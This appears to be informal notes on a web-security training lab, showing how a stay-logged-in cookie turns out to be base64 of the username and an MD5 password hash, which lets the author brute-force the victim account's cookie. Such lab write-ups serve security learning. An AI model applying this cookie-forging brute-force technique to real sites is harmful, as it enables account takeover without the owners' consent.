Lab: Brute-forcing a stay-logged-in cookie

 This lab allows users to stay logged in even after they close their browser session. The cookie used to provide this functionality is vulnerable to brute-forcing.

To solve the lab, brute-force Carlos's cookie to gain access to his My account page.

    Your credentials: wiener:peter
    Victim's username: carlos
    Candidate passwords


GET login
Cookie: session=Z6IbSssvzL6VjJhUoLfVrFpDgKTwBBd2; stay-logged-in=

POST login
username=wiener&password=peter&stay-logged-in=on

already logged

Cookie: session=riJBJD8zSeACqwXMOEL8JRmj5Teu50oQ; stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw

we have that half of the token is the user in base64

 echo "d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw" | base64 -d

wiener:51dc30ddc473d43a6011e9ebba6ca770  

and the password is md5

51dc30ddc473d43a6011e9ebba6ca770
echo -n "peter" | md5sum                              

51dc30ddc473d43a6011e9ebba6ca770  -

We want to go in carlos then we need to put

carlos: and  try with diferents password all in base64

and attack

42	Y2FybG9zOmRhNDQzYTBhZDk3OWQ1NTMwZGYzOGNhMWE3NGU0Zjgw	200	49	false	false	3346	

